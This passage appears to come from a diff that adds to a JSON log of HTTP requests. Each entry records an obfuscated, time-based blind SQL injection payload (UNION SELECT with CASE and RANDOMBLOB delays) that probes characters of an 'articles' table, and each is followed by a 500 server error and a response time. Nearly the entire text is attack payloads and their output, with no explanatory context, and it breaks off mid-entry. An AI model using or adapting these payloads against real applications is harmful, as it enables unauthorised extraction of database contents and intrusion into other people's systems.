+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3370.955999974441
+  },
+  {
+    "query": "{\"query\":\"0XCA1D' and -512 uNion SELECt 0X49F8,(SeLEct cAsE WheN ((seleCT UnICODe(SUbStr(ConTenT,0x15,1)) fRom ArTIcles wherE cOntent lIKe '%cJ%')%(sEleCT uniCOdE(SUBstR(CoNtENt,-15,1)) From arTIcles wHErE cOnTeNT likE '%cJ%')*(selEcT UNicode(sUbsTR(CoNTeNt,-29,1)) frOm ARTICLes Where conTENt lIKE '%Cj%')) LIKE 4896 theN HEx(ranDoMbLoB(1500000000/2)) eLSe HeX(RAndOmBlob(1000000000/2)) end),-39 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3495.1910000224148
+  },
+  {
+    "query": "{\"query\":\"0x7058' AnD 2484 uNIon seLeCT 0XF136,(SeLeCt caSe wheN ((selEct uNIcode(suBsTR(conTENt,-15,1)) fRom ArTicLES WHERE CONTENt lIKE '%Cj%')+(SElEcT uNicODe(subSTR(COnTeNt,-9,1)) froM aRtIcles whErE COntEnT lIKE '%CJ%')+(select UnicOdE(sUBsTR(CONtENT,0X1f,1)) FRom aRtICLes Where cOntEnt liKe '%cj%')) lIkE 252 Then hEx(RandOmBLOB(1000000000/2)) ElsE hEx(ranDomBlob(1500000000/2)) eNd),43 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2634.8719999665577
+  },
+  {
+    "query": "{\"query\":\"0Xe712' AnD -2701 uNIoN SELeCT 0xf3F5,(SeLeCt CasE whEn ((SeLECT uNicODE(sUBstR(cONTENt,0X11,1)) FROm ARticlES WHErE COntENT LIKe '%cj%')-(SELECt UnicOde(suBSTR(cONtEnT,-17,1)) From arTiCleS wheRE COnTeNT Like '%cJ%')) LikE 4 then hex(RandoMblob(1500000000/2)) ElSe hex(RandOMBLOB(1000000000/2)) eNd),36 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3187.9599999819475
+  },
+  {
+    "query": "{\"query\":\"0XdB9' AND 1694 uNion SELEct 0X4Ead,(sELect caSE WheN (hEx((sElEcT UnicoDe(sUBstr(contENT,-5,1)) froM ArTicLeS WHerE cONTENT liKe '%cJ%')-(seleCT UNICode(sUBSTR(cONteNt,0x25,1)) FroM ArTIcLES WheRE CONtEnt LIke '%cJ%')*(sElecT UNicOde(SuBsTr(ContEnt,0x24,1)) FROM aRtiCLES whERE conTENt LiKE '%cj%'))) LIke '2D35323839' thEn hex(randOMBLOb(1500000000/2)) eLse heX(RANdOmblOB(1000000000/2)) End),-8 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3372.2640000041683
+  },
+  {
+    "query": "{\"query\":\"0X763F' anD -428 UniON sElEcT 0X8007,(SelECT CAse WHen ((seLeCt UNICodE(sUBsTR(contENT,-5,1)) FroM aRtIcLes wHeRe COnTeNT Like '%Cj%')-(SElEct uNicode(subsTr(CoNTent,0x13,1)) FROM ARtIcLES WHere cONteNt LiKe '%cj%')) LIKE 51 THeN HEX(RAndomblOB(1500000000/2)) else hEX(RANDOMbLob(1000000000/2)) eNd),-2 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3369.1690000368953
+  },
+  {
+    "query": "{\"query\":\"0x1C2b' And 2559 uNioN SEleCT 0xD90,(seLECT case whEn (HEx((seLeCT UnIcoDe(SUbstR(cONTenT,0X8,1)) FROM arTICleS WheRE conteNt LIKe '%cJ%')%(seLeCT UNicoDe(sUBStr(ConTeNT,0X2b,1)) FRom articLes WhERe conTEnt liKe '%cJ%')*(SeLECT uNicodE(SuBSTr(COnTeNt,-22,1)) FrOm ARticLes WHeRe COntEnT lIKE '%cj%'))) LiKE '39363033' thEn heX(rAnDombLOB(1500000000/2)) ElsE HEX(RAnDOMbLOb(1000000000/2)) enD),98 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3175.7810000095965
+  },
+  {
+    "query": "{\"query\":\"0xd8Ce' anD -1254 UnIon selEct 0x5662,(SeleCT cAse WHeN ((seLEcT unicOdE(suBstr(cONtent,0X9,1)) frOM ARTIcLeS WhErE COnTENt LIke '%cJ%')+(sELEcT UnICODe(sUBStr(ConTENt,-40,1)) fRom ARtIcLes wheRE CoNTeNt like '%cJ%')*(SeLeCT unICodE(sUbSTr(CONTEnT,0x2,1)) FROM articles wherE cOnTenT Like '%cj%')) LIKe 3825 THEn HEX(rANdOMblOb(1500000000/2)) Else HeX(ranDoMBloB(1000000000/2)) ENd),-2 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3188.23900003054
+  },
+  {
+    "query": "{\"query\":\"0X50C5' aND -1257 UnIOn SeLECt 0xC733,(SEleCT case WHen (HEx((SelEct uNICOde(sUBStr(cONtEnt,-46,1)) FROm aRTIcleS wHerE coNTENt LIKe '%cj%')%(sELECT UNicODE(SUbsTR(CONtENt,0X22,1)) fRom ARtIcleS wHeRe coNteNt lIkE '%cj%'))) LIKE '3530' ThEN hex(rANDombLob(1000000000/2)) ElSe HEx(RaNDoMBlob(1500000000/2)) end),26 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2451.373000014003
+  },
+  {
+    "query": "{\"query\":\"0XA81d' And 1087 uniOn selECt 0x2Ba3,(SElect CAsE wHEn ((SELEct uNIcODE(sUBSTr(cOnTent,-4,1)) fRoM ARTICLeS wHErE coNtEnt LIke '%CJ%')-(sELecT uNicOdE(SUBSTr(COntEnT,-29,1)) from aRTIcLeS wHERE COnTent lIke '%Cj%')*(SeLeCT UNicODE(SUbSTr(CoNTENt,-44,1)) fROM ArticLes wHeRe cOnteNt liKe '%cJ%')) LIKE -5003 tHEn HeX(RaNdoMBLob(1500000000/2)) ElsE HEX(rANdOmbLOB(1000000000/2)) enD),36 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3353.5449999954362
+  },
+  {
+    "query": "{\"query\":\"0x5aE8' AND 2628 UNIoN SeLecT 0X1f21,(SelECt cAse WHen ((seLect unICode(sUbsTR(CoNtEnt,0xf,1)) FROM ArTicLES Where cONtENt LIKE '%Cj%')*(sELeCt uNiCOde(substr(COnTeNT,0x1b,1)) from aRTICLEs wherE coNTEnT lIKE '%Cj%')%(SElECt unICODe(SuBSTR(contENt,-29,1)) fROM ArTicLEs whERE cONTeNT liKE '%cj%')) lIkE 39 thEN HEX(ranDoMblOB(1000000000/2)) else HeX(RAndOMbLoB(1500000000/2)) End),-35 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2448.563000037696
+  },
+  {
+    "query": "{\"query\":\"0x6558' AnD 2341 UNiOn SElecT 0x5b7b,(SelECt CASE wheN (hEX((SeLECt UNICOde(SUbsTr(conTeNT,0X12,1)) FRoM artIcLeS WhERe COnTENT likE '%cj%')*(SELEcT UNiCode(substr(COnTent,0X20,1)) FRoM ARtiCLEs wHERE COnTeNT lIKe '%cj%')*(selEcT unIcODE(suBStR(cONteNT,0X15,1)) FROM ARticLES WHerE cOntent LIKE '%cJ%'))) lIkE '353035303030' Then Hex(raNdOMbloB(1500000000/2)) ELSE hEx(ranDoMBlOb(1000000000/2)) eNd),-19 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3337.4569999957084
+  },
+  {
+    "query": "{\"query\":\"0x1B88' AnD 2263 uNiOn Select 0XcF37,(SelecT CaSE wHen ((selEcT UNiCODe(SuBSTr(ContENt,-7,1)) FRom articLeS wheRE CONTENT lIKE '%CJ%')+(seLEct uNiCodE(sUBSTR(COntEnt,-14,1)) From ArTiCLES wHErE coNTEnT LIKE '%cJ%')+(SElECT unIcODE(suBsTr(cOntENt,0xe,1)) FRoM artiCLes WHeRe CONtEnT LikE '%Cj%')) LIKe 209 then HEx(RanDoMbLoB(1000000000/2)) eLSE heX(raNdOMbloB(1500000000/2)) eND),66 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2625.3010000013933
+  },
+  {
+    "query": "{\"query\":\"0xa7bf' aND 2728 uniOn select 0X1c2F,(sELEcT cASE wHEN (HEx((seleCT UNIcODe(SUBsTR(CoNTEnT,0X13,1)) fROM ArTICLes wHEre ConTENt lIke '%cJ%')+(select Unicode(suBStr(cOntEnt,-2,1)) FrOm aRTIcLeS wHERe CoNteNt LIkE '%cJ%')*(SELecT uNiCODE(suBstR(coNteNt,0x1A,1)) FRom ArTIcLES WheRe COntENT LIKE '%cj%'))) like '35303934' Then hEX(rANdOMbLob(1000000000/2)) elSe HeX(ranDOmBlob(1500000000/2)) end),-65 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2460.3689999927356
+  },
+  {
+    "query": "{\"query\":\"0Xe4C2' aNd 2708 UNIoN seleCt 0X8532,(selEct cAse WHEn ((SELECt UNICOde(Substr(COntenT,-32,1)) FrOm aRTiClES WHERe CONtENt lIke '%cj%')%(selecT UNicOde(SUBstr(coNtent,0Xd,1)) froM aRTIClEs wHERe coNteNT lIkE '%CJ%')+(SElEcT UNiCODe(sUbstR(cONTent,0XC,1)) From ArTIcleS Where CoNtenT Like '%cj%')) LikE 155 tHeN HEX(RAnDOMblOB(1000000000/2)) Else hEX(raNdOMblOB(1500000000/2)) eND),-78 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2661.769000017818
+  },
+  {
+    "query": "{\"query\":\"0xfb4B' ANd -429 uNIoN selECT 0X46df,(sELEct cAse WHEn (hex((SELect uNIcOdE(sUBsTR(CoNtenT,-19,1)) From ArtiClEs wHERE contenT like '%CJ%')%(SEleCt UniCoDE(sUBsTr(CONtEnT,-33,1)) FrOm aRTIcleS WherE cOntEnt liKE '%cJ%'))) lIKE '32' TheN Hex(rAnDOmBloB(1500000000/2)) eLSe hEx(raNDomBlob(1000000000/2)) eNd),42 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3379.0289999964352
+  },
+  {
+    "query": "{\"query\":\"0X40B4' aNd 1065 UnioN seleCT 0Xc8EF,(SeLect cASe wHEn (heX((sELECT UNICOdE(suBStR(CONtEnT,-19,1)) frOM artICleS WHERE CONTEnT Like '%cj%')%(SeleCt unICOdE(sUbsTR(COnteNt,0x25,1)) fROM ArTIcles wheRE cOnteNT liKe '%cJ%')*(SELecT UNIcOdE(suBSTR(coNTENt,-33,1)) FRoM ArTIcLES where cONteNT LiKe '%CJ%'))) liKE '32343939' tHen HeX(rAndoMbLob(1000000000/2)) eLSe HeX(RAnDOmbLOb(1500000000/2)) ENd),62 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2630.919999985356
+  },
+  {
+    "query": "{\"query\":\"0xCce1' AnD -2959 UnION sELEct 0X5D6F,(seLect case wHeN ((SelEct UNIcode(sUBsTR(ContENt,0X3,1)) From artICLeS wHERe cOntEnt LIKe '%cJ%')-(sEleCT UnicODE(sUbSTr(coNtEnT,-16,1)) FrOm ArtIClES WhEre CoNtEnT liKE '%Cj%')+(selecT unICoDe(SuBsTR(ContenT,-26,1)) FRom artIClEs WHErE ContENT LIKe '%cj%')) lIKe 97 thEN Hex(RAndoMbLOB(1500000000/2)) ElSe hex(randomblOB(1000000000/2)) eNd),-1 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3350.2279999959915
+  },
+  {
+    "query": "{\"query\":\"0x2C34' aND -134 UNion SElECT 0X210c,(sELECT cASe wHEn ((SelEct uNicOdE(SuBSTr(ConTeNt,0X17,1)) FrOm ArticLes WHEre conTENT LIke '%Cj%')-(SELECt UNICOdE(SUBStr(CoNTEnT,-15,1)) FROm arTICLeS wHErE cONtenT LIkE '%cj%')) LIke 45 theN hEX(RaNDomBLOb(1000000000/2)) elSE HEx(RANDOmblOb(1500000000/2)) End),45 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2632.1390000202764
+  },
+  {
+    "query": "{\"query\":\"0x2C8b' and 523 UNiON sElECt 0x7D7D,(SeleCT CASE WhEN ((SelECt UNICode(SubsTR(CoNTeNT,0x10,1)) FRoM artiCleS wHERE COnTEnT lIke '%CJ%')*(SeLeCT uNICOdE(SubStR(cOnteNT,0x1a,1)) froM aRTiclEs wHeRE ConTeNT lIKE '%Cj%')) LIKe 2548 thEn hEX(RaNDOmblOB(1500000000/2)) ELSe Hex(raNDOMbLOB(1000000000/2)) eNd),-72 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3332.4910000195096
+  },
+  {
+    "query": "{\"query\":\"0x48C' anD 220 unIoN SeLecT 0X7Bf4,(SELeCt cAsE wHEn (Hex((sELeCT uNICodE(subSTr(CONtEnt,-29,1)) FRom ArTIcLeS whERe coNtENT Like '%cJ%')%(selECT UnICoDe(sUbstR(coNTent,0x1D,1)) from ArTicles WherE CONTENT lIKE '%cj%')-(SeLeCt uNicode(subSTr(CoNTeNT,-41,1)) fROm ARTIcLES wHere coNTent LiKE '%CJ%'))) LIKE '2d3931' then HeX(RANDoMBlOB(1500000000/2)) ElSE HeX(raNdOmBLob(1000000000/2)) End),-69 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3183.0389999918525
+  },
+  {
+    "query": "{\"query\":\"0XBC0F' AND 1327 union Select 0x4607,(SElEct CASE wHEN (hEX((selecT UNiCODe(SuBSTr(cONTEnt,-1,1)) FROm ARTIcles wHerE cOnTENT Like '%Cj%')%(SElEct uniCode(sUBStr(ContENt,0x2B,1)) fRom ArTiCLEs WHERE cONTEnT LIKE '%cj%')*(sElECT UnIcodE(SUbSTR(coNtEnt,-16,1)) FrOm ArticLeS WhErE cOntENT lIke '%Cj%'))) LIkE '31323030' theN HEx(RanDOmbLOB(1500000000/2)) else HEx(RAnDOmBlOb(1000000000/2)) end),70 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3351.881000020407
+  },
+  {
+    "query": "{\"query\":\"0xd5f8' AND 1167 UNIoN Select 0x8434,(selECt CaSE wHEN (hex((sELEcT UNICode(SUbStR(cONtenT,0x25,1)) FroM ArtiClEs where CONTENt LIKe '%cJ%')+(selEct UNicODE(suBStr(ContENT,0x2f,1)) frOM ArticLES WhERE cOntEnT LIkE '%CJ%')*(sELEct UNIcoDe(sUBstr(CONTEnT,-20,1)) FrOm ArtIClEs wheRE contEnt likE '%cJ%'))) LiKe '34373534' tHEN HEx(raNdOMBloB(1500000000/2)) elSe hex(RaNdomBLoB(1000000000/2)) enD),-87 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3170.943000006825
+  },
+  {
+    "query": "{\"query\":\"0xA54D' anD 2659 UniOn selECt 0xDDfa,(SElEct CasE when ((sELEcT UNIcodE(sUBstr(ConTent,-21,1)) from aRTiCLes WhERE ConTENT LikE '%CJ%')*(SeLect uNiCODe(sUbsTR(cOnTeNT,-47,1)) FRom ARTICleS wHErE coNTeNt liKe '%cj%')) likE 4144 TheN hex(RandOmBLOb(1500000000/2)) ElSE hEx(RaNdoMblOb(1000000000/2)) ENd),59 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3370.5699999731705
+  },
+  {
+    "query": "{\"query\":\"0x66C1' AND -2969 uNiOn SeLeCt 0X9d6b,(SEleCT caSe wHeN (HeX((SELEcT UnICOde(sUBstR(coNtenT,0x24,1)) froM ArTiCLeS WHerE CONtENT LIkE '%cj%')+(seleCt unICOde(SubSTR(CONteNT,0xe,1)) FRom ARtICLES wheRE CONTenT LIke '%cJ%')*(selEcT UnicoDE(SUBSTR(coNTeNT,0Xf,1)) FrOm artiCleS Where CONtEnT LiKE '%cJ%'))) lIKe '35353535' thEN hEx(RaNDomblob(1500000000/2)) Else hEx(rANDOmblOB(1000000000/2)) eND),52 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3379.4870000199976
+  },
+  {
+    "query": "{\"query\":\"0X2468' And 2594 uNiON SeLECT 0X91E,(sELeCT cASe WhEN (HEX((SElECT UnICoDe(SUbStr(cOnTent,-23,1)) FROm artICLES wHere CONteNT LIkE '%cJ%')+(SELeCt UNIcOdE(SubStR(CONTenT,-18,1)) FroM ArticleS wheRe coNTenT liKe '%cJ%'))) lIKE '313530' ThEN hEx(raNdOMBLoB(1500000000/2)) else hex(ranDoMBlob(1000000000/2)) EnD),-27 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3198.588999999624
+  },
+  {
+    "query": "{\"query\":\"0x1e4F' AnD 1253 Union sELECt 0XF356,(seLECT CaSE WHEN ((SEleCT UNicOdE(SuBstR(coNTenT,-11,1)) fROm ARticles whERe CoNTeNt likE '%cj%')+(selecT UNiCoDe(sUbsTR(ContENT,0x27,1)) FrOm ArTICLeS WheRE CONtEnT LikE '%cJ%')) liKE 107 TheN HEX(rAnDOMbLoB(1000000000/2)) ELSe hex(raNDOMBlOB(1500000000/2)) End),-56 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2636.700000010956
+  },
+  {
+    "query": "{\"query\":\"0X37f3' aNd -2004 UnIOn Select 0x6863,(sElEct casE WhEN (hex((selECt uniCODe(sUBsTR(coNTEnT,0x1d,1)) from artIClES wHeRE contEnT like '%CJ%')*(SelEcT unIcode(SUBstR(COnteNT,0X1,1)) fROm ARtIClES wHerE coNtenT Like '%Cj%'))) LiKE '33323136' thEN heX(RANDOMBloB(1000000000/2)) ElSe HEX(RanDOMBlOB(1500000000/2)) End),-65 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2675.883999993868
+  },
+  {
+    "query": "{\"query\":\"0x8A5E' aND -802 unIOn sEleCt 0X55Fa,(SelecT CasE wHeN (Hex((sElEct UnicodE(substR(cOntent,-12,1)) fRoM ArtiCLES wHeRE CONtENT liKE '%Cj%')-(selEct uNiCoDe(SubSTR(cOntEnT,0x15,1)) from artIClES whEre conTenT LikE '%cj%')%(SelECt uNIcoDe(SubSTr(conteNT,-23,1)) From artiCles WhERE coNtENt lIke '%cj%'))) liKE '3530' ThEn HeX(RAnDoMBLOB(1000000000/2)) ELSe Hex(RandomBLOB(1500000000/2)) End),49 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2648.057000040881
+  },
+  {
+    "query": "{\"query\":\"0x8079' AnD 2379 union SeLECt 0X5BdF,(seLect caSe wHen (HEx((SeLEcT uNicODe(SUbstr(CONTeNT,-29,1)) FroM aRTiCLes WheRE coNtEnT LIKE '%cJ%')+(sELECT UNIcOde(SUbStR(CoNtENT,-10,1)) From aRtiCLES wHErE conTENt like '%Cj%')%(SELeCt UNIcode(SUbStR(ConTEnT,0X2e,1)) FrOm artICleS WHErE coNteNT like '%Cj%'))) liKE '313533' tHEN HEX(RaNDomBLOB(1000000000/2)) ELsE heX(rAndombLOb(1500000000/2)) End),3 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2638.3220000195315
+  },
+  {
+    "query": "{\"query\":\"0x4777' AND -1240 uNiON SELEcT 0XF36B,(SELeCt caSe WHEN ((SELecT UNiCode(SubstR(coNTENt,0x11,1)) frOm ARTicLES WHeRe CoNtEnT LIKE '%CJ%')%(SeLecT UnicODe(SUbstR(COnteNT,-8,1)) fRom ArTICLEs WHere CoNTENt LiKE '%CJ%')) liKE 2 THEN heX(raNdOmBLOb(1000000000/2)) elSE hex(RaNDomBLob(1500000000/2)) end),-88 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2633.801999995101
+  },
+  {
+    "query": "{\"query\":\"0X34eb' ANd -1175 unioN SeLECt 0xf4aa,(SELEcT CAse wheN ((SeLECt uNICoDe(sUbSTr(coNTeNT,-26,1)) fRoM aRticLES WHEre CONTENt liKe '%cJ%')+(SelECt UnicodE(subStR(cONtENT,-3,1)) FrOm ArticlEs WHerE COntEnT likE '%cj%')%(SEleCT uNiCOde(subSTR(cOnteNt,-27,1)) fROm arTiclES WheRE CoNtENt LIKe '%cj%')) LIKE 143 THEn Hex(RaNdomBLob(1000000000/2)) eLsE HeX(RandOMblOb(1500000000/2)) end),-92 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2642.1469999849646
+  },
+  {
+    "query": "{\"query\":\"0x5132' aND 1700 uNiON selECT 0xB91B,(SELecT casE wheN ((SElEcT uniCodE(SUBStR(ConTent,-37,1)) froM artiCLEs WhEre ContEnt lIKe '%cj%')-(SeLect UNIcoDe(suBstR(COntEnT,-25,1)) FRoM ArTiclES WheRE coNTEnt Like '%CJ%')-(sElECt UniCODe(SuBSTr(CoNTENT,0X2,1)) fRom aRTiClES wHerE COnteNt lIke '%CJ%')) liKe -26 then Hex(RANdOMbLoB(1500000000/2)) else hEX(RANdOMBlob(1000000000/2)) eND),24 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3383.529999979753
+  },
+  {
+    "query": "{\"query\":\"0xE8F8' And 1843 UniOn SeLect 0Xdab2,(selECt Case WHEn ((selECt UnicodE(SuBStR(cONTEnT,0X5,1)) frOM aRtIcleS wherE cONTENT LIKe '%Cj%')-(SeLect UnicoDE(sUBsTr(conTeNt,-21,1)) froM ArTiCLEs wHERe contenT LiKe '%Cj%')%(seLecT UNiCODe(sUBSTR(CONTeNt,0X25,1)) FrOm ARTIClES WhErE COnTENt LiKe '%cj%')) like -6 theN HeX(RAnDomblob(1500000000/2)) ElsE HEX(RaNDOmblOB(1000000000/2)) end),-72 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
